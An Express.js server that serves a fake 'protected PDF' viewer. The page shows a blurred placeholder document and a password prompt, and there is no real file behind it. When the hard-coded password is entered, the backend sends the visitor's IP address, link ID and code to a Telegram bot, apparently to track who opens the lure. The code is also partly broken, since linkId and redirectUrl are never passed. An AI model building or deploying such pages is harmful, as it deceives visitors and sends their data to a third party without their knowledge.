const express = require('express');
const app = express();
app.use(express.json());

// ==========================================
// YOUR HTML (Paste your exact HTML here)
// ==========================================
const myHTML = `
<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Protected PDF Document Viewer">
  <title>Project-1288.pdf - Protected preview</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      height: 100vh;
      overflow: hidden;
      background: #1a1a1a;
    }

    /* Header Bar */
    .header {
      height: 56px;
      background: #2d2d2d;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 16px;
      color: white;
    }

    .header-left {
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .pdf-icon {
      width: 32px;
      height: 32px;
      background: #e74c3c;
      border-radius: 4px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: bold;
      font-size: 10px;
    }

    .file-info {
      display: flex;
      flex-direction: column;
    }

    .filename {
      font-size: 14px;
      font-weight: 600;
    }

    .protected-label {
      font-size: 12px;
      color: #999;
      display: flex;
      align-items: center;
      gap: 4px;
    }

    .lock-icon {
      width: 12px;
      height: 12px;
    }

    .header-right {
      display: flex;
      align-items: center;
      gap: 16px;
    }

    .zoom-controls {
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 14px;
    }

    .zoom-btn {
      background: none;
      border: none;
      color: white;
      cursor: pointer;
      padding: 4px 8px;
      font-size: 16px;
    }

    .zoom-btn:hover {
      background: rgba(255,255,255,0.1);
      border-radius: 4px;
    }

    .nav-controls {
      display: flex;
      gap: 8px;
    }

    .nav-btn {
      background: none;
      border: none;
      color: white;
      cursor: pointer;
      padding: 4px 8px;
      font-size: 14px;
    }

    .nav-btn:hover {
      background: rgba(255,255,255,0.1);
      border-radius: 4px;
    }

    /* Main Container */
    .main-container {
      display: flex;
      height: calc(100vh - 56px);
    }

    /* Sidebar */
    .sidebar {
      width: 200px;
      background: #2d2d2d;
      padding: 16px;
      overflow-y: auto;
    }

    .sidebar-title {
      color: #999;
      font-size: 12px;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      margin-bottom: 16px;
    }

    .page-thumbnail {
      background: white;
      border-radius: 4px;
      margin-bottom: 16px;
      padding: 12px;
      cursor: pointer;
      transition: all 0.2s;
    }

    .page-thumbnail:hover {
      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
    }

    .page-thumbnail.active {
      box-shadow: 0 0 0 2px #4a9eff;
    }

    .thumbnail-preview {
      background: #f0f0f0;
      height: 120px;
      border-radius: 2px;
      margin-bottom: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #999;
      font-size: 12px;
    }

    .page-number {
      text-align: center;
      color: #999;
      font-size: 12px;
    }

    /* Content Area */
    .content-area {
      flex: 1;
      position: relative;
      background: #1a1a1a;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }

    /* Blurred PDF Background */
    .pdf-background {
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: white;
      filter: blur(8px);
      opacity: 0.3;
    }

    .pdf-page {
      width: 600px;
      height: 800px;
      background: white;
      margin: 20px auto;
      padding: 40px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
    }

    .pdf-line {
      height: 12px;
      background: #e0e0e0;
      margin-bottom: 16px;
      border-radius: 2px;
    }

    .pdf-line.short {
      width: 60%;
    }

    .pdf-line.medium {
      width: 80%;
    }

    /* Modal Dialog */
    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0,0,0,0.5);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 1000;
    }

    .modal {
      background: white;
      border-radius: 8px;
      padding: 48px;
      width: 520px;
      max-width: 90%;
      box-shadow: 0 8px 32px rgba(0,0,0,0.3);
    }

    .modal-icon {
      width: 48px;
      height: 48px;
      background: #e74c3c;
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 16px;
      font-weight: bold;
      color: white;
      font-size: 14px;
    }

    .modal-label {
      color: #e74c3c;
      font-size: 12px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      margin-bottom: 8px;
    }

    .modal-title {
      font-size: 28px;
      font-weight: 700;
      color: #1a1a1a;
      margin-bottom: 16px;
    }

    .modal-description {
      font-size: 15px;
      color: #666;
      line-height: 1.6;
      margin-bottom: 32px;
    }

    .form-label {
      display: block;
      font-size: 13px;
      font-weight: 600;
      color: #666;
      margin-bottom: 8px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }

    .form-input {
      width: 100%;
      height: 48px;
      padding: 0 16px;
      border: 1px solid #ddd;
      border-radius: 4px;
      font-size: 15px;
      color: #1a1a1a;
      margin-bottom: 24px;
      outline: none;
      transition: all 0.2s;
    }

    .form-input:focus {
      border-color: #4a9eff;
      box-shadow: 0 0 0 3px rgba(74, 158, 255, 0.1);
    }

    .form-input::placeholder {
      color: #999;
    }

    .submit-btn {
      width: 100%;
      height: 48px;
      background: #1a1a1a;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s;
      margin-bottom: 16px;
    }

    .submit-btn:hover {
      background: #2d2d2d;
      transform: translateY(-1px);
      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
    }

    .submit-btn:active {
      transform: translateY(0);
    }

    .modal-footer {
      font-size: 13px;
      color: #999;
      display: flex;
      align-items: center;
      gap: 6px;
    }

    .check-icon {
      color: #27ae60;
    }

    .error-message {
      color: #e74c3c;
      font-size: 13px;
      margin-top: -16px;
      margin-bottom: 16px;
      min-height: 20px;
    }

    /* Responsive */
    @media (max-width: 768px) {
      .sidebar {
        display: none;
      }
      
      .modal {
        padding: 32px 24px;
      }
      
      .modal-title {
        font-size: 24px;
      }
    }
  </style>
</head>
<body>
  <!-- Header -->
  <header class="header">
    <div class="header-left">
      <div class="pdf-icon">PDF</div>
      <div class="file-info">
        <div class="filename">Project-1288.pdf</div>
        <div class="protected-label">
          <svg class="lock-icon" viewBox="0 0 24 24" fill="currentColor">
            <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
          </svg>
          Protected preview
        </div>
      </div>
    </div>
    <div class="header-right">
      <div class="zoom-controls">
        <button class="zoom-btn">−</button>
        <span>100%</span>
        <button class="zoom-btn">+</button>
      </div>
      <div class="nav-controls">
        <button class="nav-btn">‹</button>
        <button class="nav-btn">⋯</button>
      </div>
    </div>
  </header>

  <!-- Main Container -->
  <div class="main-container">
    <!-- Sidebar -->
    <aside class="sidebar">
      <div class="sidebar-title">PAGES</div>
      <div class="page-thumbnail active">
        <div class="thumbnail-preview">
          <div style="width: 80%; height: 8px; background: #ddd; margin-bottom: 8px; border-radius: 2px;"></div>
          <div style="width: 80%; height: 8px; background: #ddd; margin-bottom: 8px; border-radius: 2px;"></div>
          <div style="width: 60%; height: 8px; background: #ddd; margin-bottom: 8px; border-radius: 2px;"></div>
          <div style="width: 100%; height: 60px; background: #f0f0f0; border-radius: 2px; margin-top: 16px;"></div>
        </div>
        <div class="page-number">1</div>
      </div>
      <div class="page-thumbnail">
        <div class="thumbnail-preview">
          <div style="width: 80%; height: 8px; background: #ddd; margin-bottom: 8px; border-radius: 2px;"></div>
          <div style="width: 80%; height: 8px; background: #ddd; margin-bottom: 8px; border-radius: 2px;"></div>
          <div style="display: flex; gap: 4px; margin-top: 16px;">
            <div style="width: 30%; height: 40px; background: #ddd; border-radius: 2px;"></div>
            <div style="width: 30%; height: 60px; background: #ddd; border-radius: 2px;"></div>
            <div style="width: 30%; height: 40px; background: #ddd; border-radius: 2px;"></div>
          </div>
        </div>
        <div class="page-number">2</div>
      </div>
    </aside>

    <!-- Content Area -->
    <main class="content-area">
      <!-- Blurred PDF Background -->
      <div class="pdf-background">
        <div class="pdf-page">
          <div class="pdf-line" style="width: 40%; margin-bottom: 32px;"></div>
          <div class="pdf-line medium"></div>
          <div class="pdf-line medium"></div>
          <div class="pdf-line medium"></div>
          <div class="pdf-line short" style="margin-top: 32px;"></div>
          <div class="pdf-line medium"></div>
          <div class="pdf-line medium"></div>
          <div style="margin-top: 48px; display: flex; gap: 16px;">
            <div style="flex: 1; height: 120px; background: #f0f0f0; border-radius: 4px;"></div>
            <div style="flex: 1; height: 120px; background: #f0f0f0; border-radius: 4px;"></div>
            <div style="flex: 1; height: 120px; background: #f0f0f0; border-radius: 4px;"></div>
          </div>
        </div>
      </div>

      <!-- Modal Dialog -->
      <div class="modal-overlay">
        <div class="modal">
          <div class="modal-icon">PDF</div>
          <div class="modal-label">PROTECTED DOCUMENT</div>
          <h1 class="modal-title">Enter the password to view</h1>
          <p class="modal-description">
            This file is locked for client review. Enter the password you were given to open the document.
          </p>

          <form id="access-form">
            <label class="form-label" for="access-code">DOCUMENT PASSWORD</label>
            <input 
              type="password" 
              id="access-code" 
              class="form-input" 
              placeholder="Enter password"
              autocomplete="off"
              required
            >
            <div class="error-message" id="error-message"></div>

            <button type="submit" class="submit-btn">Unlock document</button>
          </form>

          <div class="modal-footer">
            <span class="check-icon">✓</span>
            <span>The file stays on this page until it is unlocked</span>
          </div>
        </div>
      </div>
    </main>
  </div>

  <script>
    document.getElementById("access-form").addEventListener("submit", async function(e) {
      e.preventDefault();
      const code = document.getElementById("access-code").value;
      const errorDiv = document.getElementById("error-message");
      
      errorDiv.textContent = "Verifying...";
      
      try {
        const res = await fetch('/verify', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ code: code })
        });
        const data = await res.json();
        
        if (data.success) {
          window.location.replace(data.redirectUrl);
        } else {
          errorDiv.textContent = data.message || "Incorrect password. Please try again.";
        }
      } catch (err) {
        errorDiv.textContent = "Connection error. Please try again.";
      }
    });
  </script>
</body>
</html>
`;

// ==========================================
// THE BACKEND API
// ==========================================
app.post('/verify', async (req, res) => {
  const { code, linkId } = req.body; // Receive both password and link ID
  const CORRECT_CODE = "quote452"; // Your password
  const TARGET_URL = "https://x.com"; // Where they go after unlocking

  if (code === CORRECT_CODE) {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (token && chatId) {
      const ip = req.headers['x-forwarded-for'] || req.ip;
      const message = `🔓 *DOCUMENT UNLOCKED*\n📄 Link ID: ${linkId}\n IP: ${ip}\n✅ Code: ${code}`;
      
      try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
        });
      } catch (err) { console.error(err); }
    }
    return res.json({ success: true });
  }

  return res.status(401).json({ success: false, message: "Incorrect password." });
});

// Serve the HTML on the homepage
app.get('/', (req, res) => {
  res.send(myHTML);
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
